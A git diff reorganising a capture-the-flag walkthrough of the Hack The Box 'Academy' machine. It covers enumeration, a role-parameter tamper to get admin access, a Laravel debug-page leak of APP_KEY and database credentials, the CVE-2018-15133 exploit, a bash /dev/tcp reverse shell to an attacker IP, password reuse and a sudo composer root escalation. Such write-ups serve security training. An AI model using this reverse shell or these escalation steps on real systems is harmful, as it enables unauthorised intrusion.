@@ -2,8 +2,15 @@
 IP address : 10.10.10.215\
 OS : Linux
 
-## Enumeration
-Firstly, let us enumerate all the open ports using ```Nmap```
+## Discovery
+Before we begin, let's first add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 
+
+```
+10.10.10.215    academy.htb
+```
+
+### Nmap
+Firstly, let us enumerate all the TCP open ports
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
@@ -13,26 +20,20 @@ Firstly, let us enumerate all the open ports using ```Nmap```
 nmap -sC -sV -A -p- -T4 10.10.10.215 -vv
 ```
 
-From the output of ```NMAP```, we are able to obtain the following information about the open TCP ports:
+From the output, we are able to obtain the following information about the open TCP ports:
 | Port Number | Service | Version | State |
 |-----|------------------|----------------------|----------------------|
 | 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | Open |
 | 80	| http | Apache httpd 2.4.41 ((Ubuntu)) | Open |
 | 33069	| mysqlx? | NIL | Open |
 
-Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
+Nextm we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
 ```
 nmap -sU -Pn 10.10.10.215 -T4 -vv 
 ```
 
-Before we continue furthur, we will add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 
-
-```
-10.10.10.215    academy.htb
-```
-
-## Discovery
-Firstly, We will now run ```gobuster``` on ```http://academy.htb``` to enumerate the directories on the endpoints. However, we were unable to find any meaningful endpoints from the output. 
+### Gobuster
+We will now run ```gobuster``` on ```http://academy.htb``` to enumerate the directories on the endpoints. However, we were unable to find any meaningful endpoints from the output. 
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -87,8 +88,8 @@ http://academy.htb/config.php           (Status: 200) [Size: 0]
 http://academy.htb/index.php            (Status: 200) [Size: 2117] 
 ```
 
-Upon visiting the ```/admin.php``` endpoint, we realize that this is a login page to the admin interface of the website. Before we can access the admin page, we will first have
-to register for an admin account via the ```/register.php```. However, a normal registration doesn't seem to be able to give us admin access to the webpage. 
+### Logging into admin page
+Upon visiting the ```/admin.php``` endpoint, we realize that this is a login page to the admin interface of the website. Before we can access the admin page, we will first have to register for an admin account via the ```/register.php```. However, a normal registration doesn't seem to be able to give us admin access to the webpage. 
 
 We will now intercept the request made when we register an account. We noticed that when we register for an account, there is a ```roleid=0``` in the body of the request. We will
 then modify this to become ```roleid=1``` to try to register an admin account instead.
@@ -104,6 +105,8 @@ our ```/etc/hosts``` file.
 10.10.10.215    dev-staging-01.academy.htb academy.htb
 ```
 
+### Exposed debug interface
+
 Visiting ```http://dev-staging-01.academy.htb```, we are redirected to an exposed error page that reveals a Laravel error page, together with the environment variables, which reveals some sensitive information such as the APP_KEY and the database credentials. However, at this point in time, we are unable to view the database as it is hosted on the localhost.
 
 ![Exposed credentials from laravel debug page](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/laravel_debug.PNG)
@@ -112,13 +115,15 @@ We also realized that we are unable to decode the APP_KEY that we have obtained.
 
 ![Decoding APP_KEY](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/decode_app_key.PNG)
 
+## Exploit
+### CVE-2018-15133
 At the same time, we also realize that this website might be vulnerable to [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133), where we can carry out an RCE due to an unserialize call on a potentially untrusted X-XSRF-TOKEN value as we are able to obtain the APP_KEY. 
 
 Using the script from [here](https://github.com/aljavier/exploit_laravel_cve-2018-15133), we are able to exploit CVE-2018-15133 to spawn an interactive shell. 
 
 ![Interactive shell spawned from exploit code](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/interactive_shell.PNG)
 
-## Obtaining user flag
+### Obtaining a reverse shell
 
 First, we will try to obtain a reverse shell using ```/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.5/3000 0>&1"``` on the interactive shell. Afterwards, we will try to stabilize our reverse shell
 
@@ -138,6 +143,7 @@ stty cols 132 rows 34
 www-data@academy:/var/www/html/htb-academy-dev-01/public$
 ```
 
+### Privilege escalation to cry0l1t3
 We realize that the user flag is found in the ```/home/cry0l1t3``` directory, but we do not have the relevant permissions to read the files. Hence, we would now have to find the credentials for the user ```cry0l1t3``` so that we can elevate our privilges to the ```cry0l1t3``` user to read the user flag.
 
 ```
@@ -168,7 +174,7 @@ DB_USERNAME=dev
 DB_PASSWORD=mySup3rP4s5w0rd!!
 ```
 
-However, let's try using the DB_PASSWORD to escalate our privileges to the ```cry0l1t3``` user, and it worked! Now, all we have to do is to stabilize the shell and obtain the user flag.
+However, let's try using the DB_PASSWORD to escalate our privileges to the ```cry0l1t3``` user, and it worked! Next, all we have to do is to stabilize the shell.
 
 ```
 www-data@academy:/var/www/html/academy$ su cry0l1t3
@@ -182,12 +188,19 @@ cry0l1t3@academy:~$ export TERM=xterm
 export TERM=xterm
 cry0l1t3@academy:~$ stty cols 132 rows 34
 stty cols 132 rows 34
+cry0l1t3@academy:~$ 
+```
+
+### Obtaining user flag
+From here, all we have to do is to obtain the user flag
+
+```
 cry0l1t3@academy:~$ cat user.txt
 cat user.txt
 <Redacted user flag>
 ```
 
-## Obtaining root flag
+## Privilege Escalation to mrb3n
 Let's execute the Linpeas script again to look for privilege escalation vectors. In the output, we were able to discover that TTY passwords belonging to ```mrb3n``` was logged in the audit logs. However, the recorded password was in a hexadecimal format, and we would need to convert it to a string.
 
 ![audit logs](https://github.com/joelczk/writeups/blob/main/HTB/Images/academy/audit_logs.PNG)
@@ -214,6 +227,7 @@ stty cols 132 rows 34
 mrb3n@academy:/var/log/audit$ 
 ```
 
+### Privilege escalation to root
 Next, we will use ```sudo -l``` to find the programs that can be executed as a root without any password. From the output, we discovered that we can execute ```/usr/bin/composer``` with root privileges without any password. 
 
 ```
@@ -244,6 +258,7 @@ Do not run Composer as root/super user! See https://getcomposer.org/root for det
 #
 ```
 
+### Obtaining root flag
 Now, all that is left for us to do, is to stabilize the shell and obtain the system flag.
 
 ```
